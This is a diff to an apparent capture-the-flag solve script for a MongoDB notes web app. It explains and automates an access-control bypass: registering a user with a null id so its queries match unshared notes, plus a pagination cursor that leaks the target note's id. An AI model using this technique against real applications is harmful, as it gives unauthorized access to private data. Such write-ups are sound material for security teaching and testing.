@@ -166,20 +166,47 @@ client = NotesClient(BASE_URL)
 TARGET_NOTE_TITLE = "No one can see my privates!"
 
 """
-Step 1: get uuid of the flag note
-^ this is the first part of the expoit, the pagination leaks other's ids. 
-^ it could also be solved without knowledge of the target note's title by: enumerating all titles, then getting the content like below.
-  1. create a document with id 00000000-0000-0000-0000-000000000000 and the same title as the target note
+# Idea
+The main exploit is the null-id-user exploit, and finding the note id through the amazing cursor-based pagination
+is just a "bonus" on top to not make it directly solvable just by dumping id null into the user.
+
+# Exploit
+In the source code, the standard practice of using Mongo's _id was ignored, and (coming from sql world) instead an id field was created manually.
+`id: { type: String, default: generateId, unique: true }`
+Then, when creating users / notes, the hand-written validator first validates the input using a standard ts type guard, then directly spreads user input into Mongoose, which then strips extra keys and populates defaults.
+!However, if a user passes an id into their input JSON, this means a resource is created with a user-defined id, for example "abcd", which is not a valid uuid.
+-> What also works is to pass a json with `{ ..., "id": null }`, and the user gets created! (Step 1) 
+---
+Now what can we do with our nice user?
+Notice that the id now gets encoded into the JWT, and hence in the entire note.ts controller, the `userId: string` param actually is `null` at runtime.
+(TS types are only annotations, and if you fail to sanitize user-input as the source did or write hacky code with type casts, they can be different from runtime types)
+In the `findAccessibleNote` function, notice that the filter is `$or: [{ owner: userId }, { sharedWith: userId }]` => `$or: [{ owner: null }, { sharedWith: null }]`.
+In MongoDB, querying for `{field: null}` looks for documents where the field is either missing or has value `null`.
+It happens to be that actually a note which is shared with no one has the sharedWith array missing by design.
+-> Our null user can look up any document by id which is not shared with anyone (Step 2).
+---
+Now we just have to find the id of our target note!
+Notice that there is a function `getPaginatedRegexNotes`, which performs access checks on the server-side for whatever reason,
+and encodes the last found note in the cursor. Notice the last-found note does not have to comply to the access check.
+As such, if we can ensure that this id is exactly our target, we have found the needed id.
+-> Create a note with the same title as our target, if the note's uuid comes before our target, then our target will be the next document! (Step 0)
+    -> here, we could also create a note with random uuid and hope it comes before the target.
+-> (note: it could also be solved without knowledge of the target note's title by: enumerating all titles, then getting the content like below. but this is a little bit annoying)
+
+# Concrete Exploit Steps
+Step 0: get uuid of the flag note
+^ this is the "setup" part of the expoit, the pagination leaks other's ids. 
+  1. create a document with id 00000000-0000-0000-0000-000000000000 and the same title as the target note (or create a document with random uuid and hope this uuid comes before the target)
   2. search for documents by title with the target note's title as the regex
   3. inspect the returned cursor -> get uuid (this is the flag note's id, since it is the "next" uuid, and only one other note which is behind the current one matches the regex)
-Step 2: create a user with `null` id
-^ this is the second part of the exploit, ids are passed through to mongo on user creation and not validated from user input
-Step 3: access the flag note with our user -> will have access to the admin note since the user is null
-^ this is the third part of the exploit, when the id is null, then mongo matches all documents which are not shared with anyone (missing sharedWith field) through { sharedWith: <id> }
-Step 4: get the flag
+Step 1: create a user with `null` id
+^ this is the first part of the exploit, ids are passed through to mongo on user creation and not validated from user input
+Step 2: access the flag note with our user -> will have access to the admin note since the user is null
+^ this is the second part of the exploit, when the id is null, then mongo matches all documents which are not shared with anyone (missing sharedWith field) through { sharedWith: <id> }
+Step 3: get the flag
 """
 
-# Step 1
+# Step 0
 # just a random user to authenticate against the api, does not have to be the null user yet
 auth_response = client.create_user(
     email=f"{secrets.token_hex(8)}@example.com", password="password"
@@ -197,7 +224,7 @@ def get_flag_note_id(client: NotesClient, target_note_title: str) -> str:
     created_note = client.create_note(
         title=target_note_title,
         content="abcabc",
-        additional_json={"id": "00000000-0000-0000-0000-000000000000"},
+        additional_json={"id": "00000000-0000-1000-8000-000000000000"},
     )
     notes = client.search_notes_by_cursor(regex=target_note_title)
     if notes["nextCursor"] is None:
@@ -211,21 +238,21 @@ def get_flag_note_id(client: NotesClient, target_note_title: str) -> str:
     return cursor_content
 
 
-# Step 1
+# Step 0
 flag_note_uuid = get_flag_note_id(client, TARGET_NOTE_TITLE)
 
-# Step 2
+# Step 1
 # create a user with `null` id
 auth_response = client.create_user(
     email=f"null@example.com", password="password", additional_json={"id": None}
 )
 client.token = auth_response["token"]
 
-# Step 3
+# Step 2
 try:
     note = client.get_note_by_id(note_id=flag_note_uuid)
 
-    # Step 4
+    # Step 3
     print(f"Content of flag note: {note['content']}")
 
     password = note["content"].split(" ")[-1]
